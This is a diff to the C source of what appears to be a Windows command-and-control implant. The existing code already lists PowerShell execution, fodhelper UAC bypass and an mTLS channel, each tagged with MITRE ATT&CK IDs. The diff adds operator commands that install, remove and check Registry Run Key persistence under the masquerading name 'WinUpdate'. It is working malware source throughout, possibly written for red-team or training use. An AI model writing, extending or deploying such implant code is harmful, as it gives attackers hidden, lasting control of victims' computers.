@@ -24,6 +24,9 @@
  *   ps <commande>        — exécution via PowerShell (T1059.001)
  *   elevate              — UAC bypass fodhelper auto (T1548.002)
  *   privesc <exe_path>   — UAC bypass fodhelper manuel (T1548.002)
+ *   persist_install      — installe la persistance Registry Run Key (T1547.001)
+ *   persist_remove       — supprime la persistance
+ *   persist_status       — vérifie si la persistance est active
  *   exit                 — arrêt propre de l'implant
  *
  * Modes de compilation :
@@ -44,6 +47,7 @@
  *   T1548.002 — Abuse Elevation Control Mechanism: Bypass UAC
  *   T1071.001 — Application Layer Protocol (HTTPS/TLS)
  *   T1573.001 — Encrypted Channel (mTLS)
+ *   T1547.001 — Boot or Logon Autostart Execution: Registry Run Keys
  */
 
 #ifdef _WIN32
@@ -54,6 +58,9 @@
 
 #include "tls.h"
 #include "privesc.h"
+#ifdef _WIN32
+#include "persist.h"
+#endif
 #include <stdio.h>
 #include <string.h>
 
@@ -279,6 +286,63 @@ int main(void) {
                     out_len = snprintf(buf, BUFFER_SIZE - 4,
                         "[privesc] error — fodhelper launch failed "
                         "(code %d)\r\n", rc);
+                buf[out_len]     = '\x00';
+                buf[out_len + 1] = 'E';
+                buf[out_len + 2] = 'N';
+                buf[out_len + 3] = 'D';
+                tls_send(c, buf, out_len + 4);
+                continue;
+            }
+
+            /* persist_install — installe la persistance Registry Run Key (T1547.001) */
+            if (strcmp(cmd, "persist_install") == 0) {
+#ifdef _WIN32
+                const char *msg = (persist_install() == 0)
+                    ? "[persist] installed — HKCU\\...\\Run\r\n"
+                    : "[persist] error — registry write failed\r\n";
+#else
+                const char *msg = "[persist] not supported on this platform\r\n";
+#endif
+                int out_len = (int)strlen(msg);
+                memcpy(buf, msg, out_len);
+                buf[out_len]     = '\x00';
+                buf[out_len + 1] = 'E';
+                buf[out_len + 2] = 'N';
+                buf[out_len + 3] = 'D';
+                tls_send(c, buf, out_len + 4);
+                continue;
+            }
+
+            /* persist_remove — supprime la persistance (T1547.001) */
+            if (strcmp(cmd, "persist_remove") == 0) {
+#ifdef _WIN32
+                const char *msg = (persist_remove() == 0)
+                    ? "[persist] removed\r\n"
+                    : "[persist] error — registry delete failed\r\n";
+#else
+                const char *msg = "[persist] not supported on this platform\r\n";
+#endif
+                int out_len = (int)strlen(msg);
+                memcpy(buf, msg, out_len);
+                buf[out_len]     = '\x00';
+                buf[out_len + 1] = 'E';
+                buf[out_len + 2] = 'N';
+                buf[out_len + 3] = 'D';
+                tls_send(c, buf, out_len + 4);
+                continue;
+            }
+
+            /* persist_status — vérifie si la persistance est active (T1547.001) */
+            if (strcmp(cmd, "persist_status") == 0) {
+#ifdef _WIN32
+                const char *msg = persist_is_installed()
+                    ? "[persist] active — WinUpdate in HKCU\\...\\Run\r\n"
+                    : "[persist] not installed\r\n";
+#else
+                const char *msg = "[persist] not supported on this platform\r\n";
+#endif
+                int out_len = (int)strlen(msg);
+                memcpy(buf, msg, out_len);
                 buf[out_len]     = '\x00';
                 buf[out_len + 1] = 'E';
                 buf[out_len + 2] = 'N';
